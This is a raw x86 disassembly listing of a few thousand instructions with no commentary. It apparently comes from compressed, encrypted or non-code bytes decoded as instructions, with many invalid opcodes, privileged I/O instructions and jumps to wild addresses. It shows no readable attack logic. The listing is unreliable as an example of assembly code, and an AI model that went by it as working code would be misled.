  41e6b7:	mov    ebx,0x135381c2
  41e6bc:	push   0x4b
  41e6be:	pop    esp
  41e6bf:	add    eax,0xd31f6b29
  41e6c4:	inc    edi
  41e6c5:	sti    
  41e6c6:	js     0x41e730
  41e6c8:	xchg   ebx,eax
  41e6c9:	int3   
  41e6ca:	shr    BYTE PTR [edx+0x23eee5a7],0x99
  41e6d1:	loopne 0x41e66f
  41e6d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6d4:	mov    WORD PTR [edi+0x3daca97a],es
  41e6da:	mov    edi,0x105b2b60
  41e6df:	shl    DWORD PTR [edx],1
  41e6e1:	hlt    
  41e6e2:	lds    ebp,FWORD PTR [edi]
  41e6e4:	jp     0x41e6b0
  41e6e6:	inc    edi
  41e6e7:	aas    
  41e6e8:	aaa    
  41e6e9:	adc    BYTE PTR [ecx],ah
  41e6eb:	cdq    
  41e6ec:	mov    dh,0x1c
  41e6ee:	dec    ecx
  41e6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6f0:	cwde   
  41e6f1:	inc    esp
  41e6f2:	sub    eax,0x95491060
  41e6f7:	les    eax,FWORD PTR [ebx-0x1e]
  41e6fa:	nop
  41e6fb:	inc    ecx
  41e6fc:	shl    DWORD PTR [edi-0x66727c0d],cl
  41e702:	ficom  DWORD PTR [ebx-0x4027ed4f]
  41e708:	mov    esi,0xa6e27d55
  41e70d:	inc    ecx
  41e70e:	rol    BYTE PTR [esi+0x4c],0x33
  41e712:	mov    cl,0x9f
  41e714:	or     dh,bh
  41e716:	mov    eax,ds:0x1a539abf
  41e71b:	push   ebx
  41e71c:	push   0xa1823bba
  41e721:	adc    eax,0x40813b47
  41e726:	push   edi
  41e727:	loopne 0x41e6f0
  41e729:	(bad)
  41e72c:	inc    eax
  41e72d:	adc    eax,DWORD PTR [esi]
  41e72f:	clc    
  41e730:	xor    ebx,edx
  41e732:	mov    bh,0x1d
  41e734:	dec    ebx
  41e735:	outs   dx,BYTE PTR ds:[esi]
  41e736:	xor    edi,edi
  41e738:	xor    edi,DWORD PTR [esi+edi*1-0x40843ed8]
  41e73f:	stos   BYTE PTR es:[edi],al
  41e740:	loope  0x41e6f5
  41e742:	xor    eax,0xad6a8409
  41e747:	stos   BYTE PTR es:[edi],al
  41e748:	dec    eax
  41e749:	icebp  
  41e74a:	sub    DWORD PTR [esi+0x7c06d964],edi
  41e750:	fdiv   DWORD PTR [ebx]
  41e752:	or     BYTE PTR [edi+0x1ec4dbc],bh
  41e758:	call   0xf8138c50
  41e75d:	rep outs dx,BYTE PTR ds:[esi]
  41e75f:	inc    edi
  41e760:	(bad)  
  41e762:	mov    edi,0x80268599
  41e767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e768:	cld    
  41e769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e76a:	sahf   
  41e76b:	pop    edi
  41e76c:	cmp    ebp,ebx
  41e76e:	lods   eax,DWORD PTR ds:[esi]
  41e76f:	icebp  
  41e770:	dec    eax
  41e771:	pop    ecx
  41e772:	dec    ebx
  41e773:	cmp    ebp,DWORD PTR [esi]
  41e775:	std    
  41e776:	sbb    ch,BYTE PTR [ebp+0x63029602]
  41e77c:	outs   dx,DWORD PTR ds:[esi]
  41e77d:	retf   0x6350
  41e780:	mov    esi,0x3291a083
  41e785:	mov    edx,0x5f4675e1
  41e78a:	mov    ah,BYTE PTR [esi]
  41e78c:	mov    edx,0x9af0922a
  41e791:	and    DWORD PTR ds:0xa4230738,0xf986952f
  41e79b:	adc    BYTE PTR [esi],ah
  41e79d:	jg     0x41e7d6
  41e79f:	jb     0x41e7f9
  41e7a1:	xor    DWORD PTR [ebx-0x280cc41c],eax
  41e7a7:	and    edi,DWORD PTR [ebx]
  41e7a9:	mov    edx,0x84f48643
  41e7ae:	dec    ebp
  41e7af:	xchg   esi,eax
  41e7b0:	cs dec eax
  41e7b2:	(bad)  
  41e7b3:	mov    edx,0x70538da1
  41e7b8:	jge    0x41e7c5
  41e7ba:	retf   0x609
  41e7bd:	push   esp
  41e7be:	jo     0x41e7fc
  41e7c0:	rcl    BYTE PTR [ebx+0x48],cl
  41e7c3:	sti    
  41e7c4:	adc    cl,bh
  41e7c6:	lods   eax,DWORD PTR ds:[esi]
  41e7c7:	or     bh,BYTE PTR [ebx]
  41e7c9:	jae    0x41e7c5
  41e7cb:	sbb    ebp,DWORD PTR [ecx+esi*1+0x39]
  41e7cf:	push   edi
  41e7d0:	int3   
  41e7d1:	shl    DWORD PTR [edi+edi*8+0x4d],1
  41e7d5:	nop    DWORD PTR ds:0xe6114775
  41e7dc:	loopne 0x41e7ee
  41e7de:	push   ebp
  41e7df:	cld    
  41e7e0:	dec    edx
  41e7e1:	rcr    BYTE PTR [ebp-0xf],0x8b
  41e7e5:	sub    DWORD PTR [edx+0x444d9fcd],ecx
  41e7eb:	hlt    
  41e7ec:	add    BYTE PTR [ecx],dl
  41e7ee:	call   0x69bb2174
  41e7f3:	cmp    eax,0x87418c55
  41e7f8:	stos   BYTE PTR es:[edi],al
  41e7f9:	lock cmp ch,0xdb
  41e7fd:	fld    st(6)
  41e7ff:	sub    al,0x3c
  41e801:	sub    eax,0xf0bc4c24
  41e806:	out    0x64,eax
  41e808:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41e80a:	xchg   edi,eax
  41e80b:	and    al,0xa2
  41e80d:	cmp    al,0x86
  41e80f:	in     al,0x7e
  41e811:	fwait
  41e812:	or     al,BYTE PTR ds:0x1b5104fb
  41e818:	jmp    0x41e81a
  41e81a:	push   eax
  41e81b:	inc    ebx
  41e81c:	and    BYTE PTR [esi+0x77],0x77
  41e820:	jae    0x41e888
  41e822:	fstp   DWORD PTR [eax+0x54731ad1]
  41e828:	jbe    0x41e7e9
  41e82a:	mov    ebx,0xe2d5c370
  41e82f:	adc    eax,0x4a9a1729
  41e834:	in     eax,dx
  41e835:	add    edx,DWORD PTR [ebx+0x25c44330]
  41e83b:	add    edx,eax
  41e83d:	jmp    0x41e8b9
  41e83f:	mov    ah,BYTE PTR [ebx+eax*8]
  41e842:	pop    ecx
  41e843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e844:	adc    dh,0xea
  41e847:	in     al,0x6d
  41e849:	pop    ss
  41e84a:	rcl    DWORD PTR [eax-0x5f202c59],0x71
  41e851:	shl    DWORD PTR [ebp+0x73],1
  41e854:	(bad)  
  41e855:	jp     0x41e816
  41e857:	and    DWORD PTR [ebx-0x46f4862b],ecx
  41e85d:	dec    eax
  41e85e:	xor    DWORD PTR [edi+eax*2+0x28],ebp
  41e862:	add    eax,0xe2a21d27
  41e867:	ret    
  41e868:	pop    edi
  41e869:	inc    edx
  41e86a:	cmp    eax,DWORD PTR [ebx]
  41e86c:	cmp    bl,BYTE PTR [ecx]
  41e86e:	mov    eax,ds:0xdbb91b8c
  41e873:	cli    
  41e874:	dec    edi
  41e875:	les    ecx,FWORD PTR [ecx]
  41e877:	fwait
  41e878:	or     eax,0x98a72ea3
  41e87d:	jne    0x41e80e
  41e87f:	xor    eax,DWORD PTR [edi-0x3e]
  41e882:	inc    esi
  41e883:	imul   ebp,DWORD PTR [ecx+0x2ca93de7],0x5ce31bac
  41e88d:	xchg   ebx,edi
  41e88f:	cmp    DWORD PTR [edx],esi
  41e891:	sahf   
  41e892:	jae    0x41e836
  41e894:	jbe    0x41e830
  41e896:	mov    bh,0x4d
  41e898:	adc    al,0x79
  41e89a:	mov    dl,0xc9
  41e89c:	jo     0x41e833
  41e89e:	ret    0xdfbb
  41e8a1:	(bad)  
  41e8a2:	out    0xfa,al
  41e8a4:	aam    0x62
  41e8a6:	cld    
  41e8a7:	push   eax
  41e8a8:	outs   dx,BYTE PTR ds:[esi]
  41e8a9:	bts    DWORD PTR [ecx-0x52],ebp
  41e8ad:	pop    eax
  41e8ae:	sti    
  41e8af:	fst    DWORD PTR [ebp+0x2558e82e]
  41e8b5:	sbb    DWORD PTR [esi+esi*1+0x17dc6135],eax
  41e8bc:	cmp    eax,0x6f6bc485
  41e8c1:	inc    ecx
  41e8c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8c3:	mov    dh,0x22
  41e8c5:	mov    ebp,0x2b6b76
  41e8ca:	ror    DWORD PTR [edi-0x3f296490],0xb8
  41e8d1:	sub    BYTE PTR [ecx],dh
  41e8d3:	xlat   BYTE PTR ds:[bx]
  41e8d5:	test   eax,0x131dd1da
  41e8da:	loope  0x41e8a5
  41e8dc:	pop    edx
  41e8dd:	jmp    0x41e8ab
  41e8df:	push   ecx
  41e8e0:	dec    eax
  41e8e1:	ss add eax,0x442acf68
  41e8e7:	mov    al,0xc3
  41e8e9:	jbe    0x41e86c
  41e8eb:	inc    ecx
  41e8ec:	shl    DWORD PTR [eax+esi*4],cl
  41e8ef:	imul   edi,eax,0x6b
  41e8f2:	lods   al,BYTE PTR ds:[esi]
  41e8f3:	jp     0x41e8fe
  41e8f5:	test   bh,dl
  41e8f7:	cmp    esi,ecx
  41e8f9:	jmp    0x3a3c:0x72201535
  41e900:	popa   
  41e901:	leave  
  41e902:	mov    edi,DWORD PTR [ecx-0x57]
  41e905:	dec    si
  41e907:	sub    DWORD PTR [ebx+0x49],ebp
  41e90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e90b:	mov    esi,eax
  41e90d:	outs   dx,DWORD PTR ds:[esi]
  41e90e:	and    dh,BYTE PTR [esi+ecx*1+0x32]
  41e912:	aas    
  41e913:	lds    edx,FWORD PTR [ebx]
  41e915:	dec    esi
  41e916:	mov    ebp,DWORD PTR [ebx+edx*1+0x78]
  41e91a:	out    dx,al
  41e91b:	inc    edi
  41e91c:	int    0xc2
  41e91e:	xlat   BYTE PTR ds:[ebx]
  41e91f:	mov    esp,0x977a9000
  41e924:	in     al,0x2e
  41e926:	in     al,0x68
  41e928:	push   0xfffffff1
  41e92a:	jle    0x41e957
  41e92c:	lahf   
  41e92d:	jb     0x41e98b
  41e92f:	and    eax,0x2510fa80
  41e934:	xchg   ecx,eax
  41e935:	fidiv  WORD PTR [esi+0x4b1b4319]
  41e93b:	stos   DWORD PTR es:[edi],eax
  41e93c:	jmp    0xc1cfea1e
  41e941:	and    esi,DWORD PTR [eax+eax*4-0x27c3d1b4]
  41e948:	fsub   QWORD PTR [ebx]
  41e94a:	in     eax,dx
  41e94b:	call   0xfde25782
  41e950:	sbb    bh,BYTE PTR [edi-0x1e35fd32]
  41e956:	stos   BYTE PTR es:[edi],al
  41e957:	dec    BYTE PTR [edx]
  41e959:	(bad)  
  41e95a:	jmp    0x41e980
  41e95c:	pop    ecx
  41e95d:	call   0x5780:0xa5c46066
  41e964:	jge    0x2efd575a
  41e96a:	push   ss
  41e96b:	xchg   ebp,eax
  41e96c:	retf   
  41e96d:	add    bl,BYTE PTR [esi-0x76d1c509]
  41e973:	dec    edi
  41e974:	or     dh,BYTE PTR [eax-0x4539f08]
  41e97a:	lahf   
  41e97b:	and    edi,eax
  41e97d:	add    eax,0x3bac680b
  41e982:	cli    
  41e983:	hlt    
  41e984:	in     eax,dx
  41e985:	mov    ecx,0x97d396c4
  41e98a:	je     0x41e9b8
  41e98c:	gs mov al,0xa1
  41e98f:	adc    eax,DWORD PTR [esp+ebx*4+0x5a5308b8]
  41e996:	xchg   edx,eax
  41e997:	xor    eax,0x700c8b8f
  41e99c:	add    eax,0xb1fe9810
  41e9a1:	sub    cl,BYTE PTR [eax+0x3a]
  41e9a4:	push   ecx
  41e9a5:	call   0x5e767f7c
  41e9aa:	inc    edx
  41e9ab:	out    dx,eax
  41e9ac:	xor    bl,BYTE PTR [ebx-0x1]
  41e9af:	int    0xe6
  41e9b1:	cmp    edx,DWORD PTR [edi+0x8]
  41e9b4:	mov    cl,0x50
  41e9b6:	cli    
  41e9b7:	into   
  41e9b8:	repnz imul edi,DWORD PTR [eax-0x42199430],0x88eab612
  41e9c3:	or     eax,0x30828b8e
  41e9c8:	outs   dx,DWORD PTR ds:[esi]
  41e9c9:	xor    ah,BYTE PTR [edx-0xf]
  41e9cc:	adc    eax,0x2dc3da40
  41e9d1:	nop
  41e9d2:	popa   
  41e9d3:	adc    DWORD PTR [ecx+0x6b],ebp
  41e9d6:	out    0xd2,al
  41e9d8:	fdiv   DWORD PTR [edi]
  41e9da:	pop    DWORD PTR [eax-0x6]
  41e9dd:	dec    eax
  41e9de:	xchg   ebx,eax
  41e9df:	sub    al,ah
  41e9e1:	ds cwde 
  41e9e3:	je     0x41ea23
  41e9e5:	pop    edx
  41e9e6:	xor    dh,ch
  41e9e8:	jmp    0x41ea48
  41e9ea:	mov    bh,BYTE PTR [ebx+0x16]
  41e9ed:	(bad)  
  41e9ef:	mov    ss,WORD PTR [bp+di+0x70b9]
  41e9f4:	shl    DWORD PTR [edx+edx*4+0x290988c],1
  41e9fb:	in     eax,0x3e
  41e9fd:	pop    ds
  41e9fe:	outs   dx,DWORD PTR ds:[esi]
  41e9ff:	push   ss
  41ea00:	mov    ecx,0xca8863ac
  41ea05:	fs aaa 
  41ea07:	xchg   esi,eax
  41ea08:	fcomp  QWORD PTR [ecx]
  41ea0a:	clc    
  41ea0b:	push   es
  41ea0c:	jne    0x41ea2a
  41ea0e:	dec    eax
  41ea0f:	push   ecx
  41ea10:	fcomp  DWORD PTR [ebp-0x1d]
  41ea13:	mov    ch,0x5
  41ea15:	rcl    DWORD PTR [edx+0x1904afa2],1
  41ea1b:	and    edx,DWORD PTR [ebx]
  41ea1d:	push   es
  41ea1e:	adc    eax,0x2da24c4b
  41ea23:	call   0x8434:0x2033024b
  41ea2a:	fcomp  DWORD PTR [edi+ebx*8]
  41ea2d:	mov    esi,0x2431d001
  41ea32:	cmp    DWORD PTR [ebp+0x2cab55f1],0x6d656489
  41ea3c:	adc    DWORD PTR [esi+0x3f],esp
  41ea3f:	test   BYTE PTR [edx],bh
  41ea41:	jno    0x41ea0f
  41ea43:	in     eax,dx
  41ea44:	js     0x41eaa7
  41ea46:	mov    eax,0x142e8cdf
  41ea4b:	cld    
  41ea4c:	out    dx,al
  41ea4d:	mov    DWORD PTR [edx-0x628ba38],ecx
  41ea53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea54:	ins    DWORD PTR es:[edi],dx
  41ea55:	add    ch,BYTE PTR [ecx+esi*8-0x64ec5dba]
  41ea5c:	sub    ah,BYTE PTR [edi]
  41ea5e:	push   edx
  41ea5f:	pop    ds
  41ea60:	ss arpl WORD PTR es:0x405076d2,di
  41ea68:	pop    ecx
  41ea69:	int    0x1f
  41ea6b:	xchg   edx,eax
  41ea6c:	aas    
  41ea6d:	pop    eax
  41ea6e:	sbb    eax,0x2d32e1a4
  41ea73:	repnz mov dh,BYTE PTR [esi]
  41ea76:	add    eax,0xa1a42509
  41ea7b:	ret    
  41ea7c:	fmul   QWORD PTR [ebp-0x50]
  41ea7f:	jnp    0x41eaf3
  41ea81:	jge    0x41eab4
  41ea83:	inc    ebp
  41ea84:	mov    bh,0x6
  41ea86:	inc    ecx
  41ea87:	test   ah,dl
  41ea89:	rcr    BYTE PTR [eax-0x907a3e4],0x75
  41ea90:	sti    
  41ea91:	je     0x41ea6a
  41ea93:	fsub   DWORD PTR [esi+0x6fe08e1b]
  41ea99:	sahf   
  41ea9a:	cld    
  41ea9b:	xor    ah,BYTE PTR gs:[edi]
  41ea9e:	push   0x6bcdc24
  41eaa3:	test   al,0x4f
  41eaa5:	xchg   BYTE PTR [edi-0x2b],ah
  41eaa8:	inc    sp
  41eaaa:	adc    eax,0x60641b7e
  41eaaf:	xor    al,0xcb
  41eab1:	dec    ebp
  41eab2:	adc    BYTE PTR [ebx],0xf0
  41eab5:	pop    ss
  41eab6:	xchg   ebx,eax
  41eab7:	jmp    0xebc6f466
  41eabc:	cmp    BYTE PTR [ebp*2-0x788b5b33],bl
  41eac3:	sbb    bh,BYTE PTR [esi+0xb]
  41eac6:	sub    ch,BYTE PTR [esp+ecx*2+0x61]
  41eaca:	daa    
  41eacb:	fnstcw WORD PTR [ebp-0x3a]
  41eace:	je     0x41eb1f
  41ead0:	out    dx,al
  41ead1:	call   FWORD PTR [edx+0x11277a99]
  41ead7:	push   edx
  41ead8:	rcl    DWORD PTR [ebp+ecx*8-0x1c],cl
  41eadc:	fild   QWORD PTR [edi+edx*2+0x7c6ea2fe]
  41eae3:	xor    al,0x8a
  41eae5:	and    dh,BYTE PTR [eax+0x258d679d]
  41eaeb:	cli    
  41eaec:	push   ecx
  41eaed:	sbb    BYTE PTR [ecx-0x4abc507c],dl
  41eaf3:	cmp    esi,DWORD PTR [eax+0x44fdb419]
  41eaf9:	mov    al,0xec
  41eafb:	stos   DWORD PTR es:[edi],eax
  41eafc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eafd:	shl    ch,1
  41eaff:	jmp    0x41eac0
  41eb01:	fyl2xp1 
  41eb03:	je     0x41eafe
  41eb05:	push   0xd
  41eb07:	test   DWORD PTR [ecx],ebx
  41eb09:	pop    ds
  41eb0a:	sbb    esi,ecx
  41eb0c:	enter  0x984a,0xdc
  41eb10:	push   edi
  41eb11:	out    0xf4,al
  41eb13:	xor    eax,0x877564fc
  41eb18:	cwde   
  41eb19:	cli    
  41eb1a:	ins    DWORD PTR es:[edi],dx
  41eb1b:	int    0xca
  41eb1d:	jo     0x41eade
  41eb1f:	ja     0x41eb01
  41eb21:	jl     0x41eb84
  41eb23:	adc    al,0xbc
  41eb25:	push   ds
  41eb26:	or     eax,0x8a12ab66
  41eb2b:	sbb    eax,0x9cdf21b6
  41eb30:	js     0x41eb14
  41eb32:	retf   
  41eb33:	idiv   BYTE PTR [edx-0x2718ebb1]
  41eb39:	push   ebx
  41eb3a:	call   0x2fff:0x9381bd68
  41eb41:	mov    ds:0x26caeb94,eax
  41eb46:	add    BYTE PTR [esi-0x3100998d],0xce
  41eb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb4e:	sub    edx,DWORD PTR [eax]
  41eb50:	xor    al,0x69
  41eb52:	sbb    eax,0x4c04433
  41eb57:	call   0xe7:0xd935bd1d
  41eb5e:	xor    ecx,ecx
  41eb60:	popf   
  41eb61:	jg     0x41eaf7
  41eb63:	jmp    0xf6c45d24
  41eb68:	adc    DWORD PTR [esp+ecx*4-0x19],ebx
  41eb6c:	mov    BYTE PTR [edi+edi*8],bh
  41eb6f:	aas    
  41eb70:	mov    eax,0x68e1ed9
  41eb75:	in     al,dx
  41eb76:	cdq    
  41eb77:	mov    ch,0xc3
  41eb79:	jb     0x41eb77
  41eb7b:	lock push 0xffffff81
  41eb7e:	int    0x7f
  41eb80:	popf   
  41eb81:	inc    edx
  41eb82:	call   0x8eaa:0x5f0a191b
  41eb89:	xor    DWORD PTR [ebx+edi*8-0x770683ed],eax
  41eb90:	jmp    0x41eb3d
  41eb92:	aaa    
  41eb93:	retf   
  41eb94:	fisttp WORD PTR [edi-0x7e]
  41eb97:	xor    eax,0xd65c5aa9
  41eb9c:	push   esi
  41eb9d:	xchg   esp,eax
  41eb9e:	and    eax,ebp
  41eba0:	push   ebp
  41eba1:	hlt    
  41eba2:	mov    dh,0xa3
  41eba4:	mov    edi,0xf9801c76
  41eba9:	std    
  41ebaa:	dec    DWORD PTR [ecx-0x493cb77d]
  41ebb0:	or     eax,0xf95e8055
  41ebb5:	sbb    ebp,DWORD PTR [eax]
  41ebb7:	retf   
  41ebb8:	scas   al,BYTE PTR es:[edi]
  41ebb9:	jle    0x41ec24
  41ebbb:	push   eax
  41ebbc:	and    edi,DWORD PTR ds:0x201a4123
  41ebc2:	jmp    0xdc84d00a
  41ebc7:	sbb    al,BYTE PTR ds:0x62ccd4a
  41ebcd:	jmp    0x1dd7626b
  41ebd2:	(bad)  
  41ebd3:	jne    0x41ec0f
  41ebd5:	mov    BYTE PTR [edx+0x1eb8a643],cl
  41ebdb:	inc    esp
  41ebdc:	xor    ebx,DWORD PTR [ecx+0x60]
  41ebdf:	sbb    ch,al
  41ebe1:	daa    
  41ebe2:	add    al,0x6b
  41ebe4:	pop    ebp
  41ebe5:	cmc    
  41ebe6:	cmovno ecx,DWORD PTR [edx+0x6ebf3696]
  41ebed:	dec    edi
  41ebee:	out    dx,eax
  41ebef:	inc    esi
  41ebf0:	push   es
  41ebf1:	sahf   
  41ebf2:	pop    ss
  41ebf3:	mov    ch,dl
  41ebf5:	push   esp
  41ebf6:	imul   ebx,edx,0x4d
  41ebf9:	mov    eax,esi
  41ebfb:	std    
  41ebfc:	gs mov ch,0x54
  41ebff:	leave  
  41ec00:	mov    esp,0x7a348af
  41ec05:	pop    edx
  41ec06:	or     DWORD PTR [ecx],0x3e
  41ec09:	push   0xffffffd3
  41ec0b:	mov    WORD PTR [ebx],fs
  41ec0d:	mov    eax,ds:0xdacfc91f
  41ec12:	xchg   ecx,eax
  41ec13:	test   ch,dl
  41ec15:	xchg   esi,eax
  41ec16:	cmp    BYTE PTR [ecx+0x4e],bl
  41ec19:	or     al,0x9b
  41ec1b:	fcom   DWORD PTR [ebp-0x1913f2ff]
  41ec21:	out    0xc3,eax
  41ec23:	or     eax,0xcdc5a7dc
  41ec28:	dec    eax
  41ec29:	add    dl,ch
  41ec2b:	pop    esi
  41ec2c:	daa    
  41ec2d:	lahf   
  41ec2e:	xor    BYTE PTR [ebx],bh
  41ec30:	addr16 or esi,esi
  41ec33:	mov    BYTE PTR [ebp-0x46],0x80
  41ec37:	loope  0x41ec10
  41ec39:	call   DWORD PTR [esi+0x21]
  41ec3c:	shr    DWORD PTR ds:[eax],1
  41ec3f:	jmp    0x41ec01
  41ec41:	(bad)  
  41ec42:	jmp    0x41ec9e
  41ec44:	arpl   WORD PTR [esi+ebx*1-0x79eb3a8b],dx
  41ec4b:	retf   
  41ec4c:	iret   
  41ec4d:	or     ecx,DWORD PTR [ebx+ebp*1+0x37f208d5]
  41ec54:	mov    al,0xfd
  41ec56:	in     eax,dx
  41ec57:	adc    DWORD PTR [edi],ebp
  41ec59:	retf   0xc517
  41ec5c:	scas   eax,DWORD PTR es:[edi]
  41ec5d:	and    eax,ebp
  41ec5f:	cdq    
  41ec60:	shr    BYTE PTR [esi-0x28],0x34
  41ec64:	cld    
  41ec65:	aaa    
  41ec66:	popf   
  41ec67:	pop    esi
  41ec68:	inc    esp
  41ec69:	inc    ecx
  41ec6a:	pop    esi
  41ec6b:	mov    WORD PTR [ebx],gs
  41ec6d:	jb     0x41ec46
  41ec6f:	dec    ecx
  41ec70:	or     esp,edi
  41ec72:	test   ch,ah
  41ec74:	or     esp,DWORD PTR ds:0x83987f3c
  41ec7a:	outs   dx,DWORD PTR ds:[esi]
  41ec7b:	mov    ebp,0xfc4b50b
  41ec80:	lods   eax,DWORD PTR ds:[esi]
  41ec81:	addr16 dec esi
  41ec83:	fstp   DWORD PTR [ebx]
  41ec85:	sub    DWORD PTR [eax+0x6e],ebp
  41ec88:	sub    eax,0x682c2502
  41ec8d:	and    ch,BYTE PTR [ecx-0x50]
  41ec90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec91:	ret    0x13fd
  41ec94:	fld    DWORD PTR [ecx]
  41ec96:	dec    ebx
  41ec97:	pop    esp
  41ec98:	gs mov ebx,0xd11a0d69
  41ec9e:	aas    
  41ec9f:	shl    BYTE PTR ds:0x8f889e3d,cl
  41eca5:	jge    0x41ed1a
  41eca7:	(bad)  
  41eca9:	mov    ss,WORD PTR [esi]
  41ecab:	scas   eax,DWORD PTR es:[edi]
  41ecac:	bound  ecx,QWORD PTR [edx]
  41ecae:	or     ecx,DWORD PTR [edi+edi*1]
  41ecb1:	(bad)  
  41ecb2:	test   DWORD PTR [esi+0x56f202ff],edi
  41ecb8:	jp     0x41ed37
  41ecba:	xor    bh,BYTE PTR [ebx+ecx*8-0x10]
  41ecbe:	shl    DWORD PTR [ebx+0x19c4895d],0x3c
  41ecc5:	add    DWORD PTR [ebx],edi
  41ecc7:	or     DWORD PTR [ebp+ecx*1-0x31],edi
  41eccb:	or     al,0x24
  41eccd:	fnstenv [edx]
  41eccf:	add    edi,edx
  41ecd1:	mov    ebx,0xc110b9f9
  41ecd6:	mov    BYTE PTR [esi],dh
  41ecd8:	dec    edi
  41ecd9:	aam    0xc4
  41ecdb:	inc    ebx
  41ecdc:	addr16 cs pop es
  41ecdf:	dec    edx
  41ece0:	jl     0x41ecd7
  41ece2:	pop    esi
  41ece3:	mov    ds:0x5112b44f,eax
  41ece8:	jmp    0x41ed48
  41ecea:	xor    eax,0x6d2c16c4
  41ecef:	jle    0x41ecc2
  41ecf1:	add    esp,DWORD PTR [esi+0x7eec5b07]
  41ecf7:	mov    cl,0x5c
  41ecf9:	mov    ds:0x2c8b1d28,eax
  41ecfe:	cwde   
  41ecff:	pop    esp
  41ed00:	push   0x3a
  41ed02:	js     0x41ec90
  41ed04:	xchg   ebp,eax
  41ed05:	icebp  
  41ed06:	das    
  41ed07:	div    DWORD PTR [ebx+0x53ef9bbf]
  41ed0d:	and    esp,DWORD PTR [ebx+0x5a]
  41ed10:	loop   0x41ecb1
  41ed12:	es push esi
  41ed14:	pop    es
  41ed15:	jo     0x41ed52
  41ed17:	adc    eax,0x7bd17ad1
  41ed1c:	repz lock jnp 0x41eccf
  41ed20:	iret   
  41ed21:	(bad)  
  41ed22:	cmp    dl,ah
  41ed24:	ss or  al,0x24
  41ed27:	jnp    0x41ed64
  41ed29:	not    BYTE PTR [eax]
  41ed2b:	dec    ecx
  41ed2c:	lods   eax,DWORD PTR ds:[esi]
  41ed2d:	push   ebx
  41ed2e:	(bad)  
  41ed2f:	mov    edx,0x86f6cac8
  41ed34:	push   0xffffff92
  41ed36:	pusha  
  41ed37:	js     0x41ed1e
  41ed39:	(bad)  
  41ed3a:	(bad)  
  41ed3b:	das    
  41ed3c:	iret   
  41ed3d:	icebp  
  41ed3e:	mov    BYTE PTR [ecx+0xe272a84],bl
  41ed44:	dec    ebp
  41ed45:	mov    esi,ebx
  41ed47:	ret    0x1db
  41ed4a:	out    dx,eax
  41ed4b:	out    dx,al
  41ed4c:	xchg   ecx,eax
  41ed4d:	sub    edi,edi
  41ed4f:	mov    dh,0xb4
  41ed51:	cs jp  0x41ece7
  41ed54:	mov    ebx,0xe122990e
  41ed59:	jp     0x41ed76
  41ed5b:	jbe    0x41ed5a
  41ed5d:	cli    
  41ed5e:	gs add bh,ah
  41ed61:	inc    esp
  41ed62:	xchg   edi,eax
  41ed63:	(bad)  
  41ed64:	fnsave [ecx-0x34]
  41ed67:	cmp    DWORD PTR [esi],0x3b8fc95a
  41ed6d:	push   es
  41ed6e:	(bad)  
  41ed6f:	mov    bh,0x3f
  41ed71:	dec    esi
  41ed72:	sub    BYTE PTR [ebx-0x4f],ch
  41ed75:	clc    
  41ed76:	fcom   st(1)
  41ed78:	sub    edi,edx
  41ed7a:	jmp    0x494a:0xaf7e9c7b
  41ed81:	and    al,BYTE PTR [ebx-0x6d]
  41ed84:	pushf  
  41ed85:	out    0x76,eax
  41ed87:	cmc    
  41ed88:	int3   
  41ed89:	jl     0x41ed85
  41ed8b:	out    dx,al
  41ed8c:	call   0xf7f0ccfd
  41ed91:	out    dx,al
  41ed92:	(bad)  
  41ed93:	scas   eax,DWORD PTR es:[edi]
  41ed94:	ret    0x5bfe
  41ed97:	mov    al,ds:0xf4bb4229
  41ed9c:	out    0xb4,eax
  41ed9e:	aam    0x4
  41eda0:	mov    WORD PTR gs:[eax+0x531c4359],?
  41eda7:	pusha  
  41eda8:	out    dx,al
  41eda9:	jno    0x41ed31
  41edab:	sahf   
  41edac:	add    ah,BYTE PTR [edx+eax*1+0x34]
  41edb0:	xchg   ebx,eax
  41edb1:	test   al,0x55
  41edb3:	loopne 0x41ee34
  41edb5:	xor    eax,0x745b03cd
  41edba:	retf   0xb341
  41edbd:	in     al,0x14
  41edbf:	push   edi
  41edc0:	icebp  
  41edc1:	push   0xffffffd7
  41edc3:	and    dl,dh
  41edc5:	sbb    edi,DWORD PTR [edx+eax*4+0x79]
  41edc9:	lods   al,BYTE PTR ds:[esi]
  41edca:	addr16 and al,0x39
  41edcd:	xor    dh,BYTE PTR cs:[esp+eiz*2]
  41edd1:	mov    WORD PTR [edx],cs
  41edd3:	xlat   BYTE PTR ds:[ebx]
  41edd4:	pop    ecx
  41edd5:	and    al,0x4e
  41edd7:	das    
  41edd8:	push   eax
  41edd9:	pusha  
  41edda:	pusha  
  41eddb:	dec    DWORD PTR [edx+esi*1]
  41edde:	and    DWORD PTR [ecx],edi
  41ede0:	xchg   ecx,eax
  41ede1:	adc    dh,BYTE PTR [ebx+eiz*1+0x40]
  41ede5:	fld    QWORD PTR [esp+eax*4]
  41ede8:	xor    ebx,DWORD PTR [ecx-0x469507c2]
  41edee:	or     BYTE PTR [esp+esi*2+0x68],0xbb
  41edf3:	in     eax,0xa1
  41edf5:	icebp  
  41edf6:	pop    ebx
  41edf7:	das    
  41edf8:	adc    eax,ecx
  41edfa:	mov    ecx,0x7d36e1af
  41edff:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee01:	lods   eax,DWORD PTR ds:[esi]
  41ee02:	pop    ebx
  41ee03:	dec    esi
  41ee04:	test   BYTE PTR fs:[ebx+edx*2+0x18822f01],bl
  41ee0c:	jmp    0xa902688f
  41ee11:	ret    
  41ee12:	int3   
  41ee13:	mov    edx,0xdda0ea27
  41ee18:	stos   DWORD PTR es:[edi],eax
  41ee19:	shl    BYTE PTR [ebx-0x6c],0xdf
  41ee1d:	sar    DWORD PTR [esi],0x3
  41ee20:	retf   0x854a
  41ee23:	or     BYTE PTR [ebp-0x3b],ch
